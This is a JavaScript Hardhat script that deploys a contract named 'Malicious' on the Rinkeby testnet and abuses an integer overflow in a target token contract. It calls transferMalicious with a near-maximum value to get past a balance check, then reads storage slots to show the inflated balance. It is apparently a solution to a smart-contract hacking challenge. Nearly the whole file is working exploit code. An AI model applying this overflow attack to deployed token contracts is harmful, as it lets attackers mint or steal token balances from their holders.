/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const {deployed} = require('./deployed')
const {abi} = require('./abi')
const INSTANCE = "0x6460d7Ba79c4aCDb96257dd60B37C6f3021C3736"
const CREATOR = "0x63bE8347A617476CA461649897238A31835a32CE"
MAX_INT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'


async function instanceState(rinkeby, deployer) {
  console.log('                          INSTANCE STATE')

  // mapping key = creator address
  const index = ethers.utils.hexZeroPad(0, 32)
  const key = ethers.utils.hexZeroPad(CREATOR, 32)
  const creatorKey = ethers.utils.keccak256(ethers.utils.concat([key, index]))

  // mapping key = our address
  const index2 = ethers.utils.hexZeroPad(0, 32)
  const key2 = ethers.utils.hexZeroPad(deployer.address, 32)
  const myKey = ethers.utils.keccak256(ethers.utils.concat([key2, index2]))

  console.log("Storage '0': balance of creator", ethers.BigNumber.from(await rinkeby.getStorageAt(INSTANCE, creatorKey)).toString(), 'ETH')
  console.log("Storage '0': our balance", ethers.BigNumber.from(await rinkeby.getStorageAt(INSTANCE, myKey)).toString(), 'ETH')
  console.log(`Storage '1': Total supply`, ethers.BigNumber.from(await rinkeby.getStorageAt(INSTANCE, 1)).toString(), 'ETH')
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')

  console.log(`Deploying contract with ${deployer.address}`)
  const Malicious = await hre.ethers.getContractFactory('Malicious')
  const malicious = await Malicious.deploy(INSTANCE)

  await malicious.deployed()

  await deployed('Malicious', hre.network.name, malicious.address)

  await instanceState(rinkeby, deployer)
  
  // STEP 1
  // We will use the overflow interger de bypass the require mouahahaha
  // hacking the token contract...
  const tx = await malicious.transferMalicious(ethers.BigNumber.from(MAX_INT).sub(20))
  await tx.wait()
  console.log("Hack proceeded sucessfully\n")

  
  await instanceState(rinkeby, deployer)
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
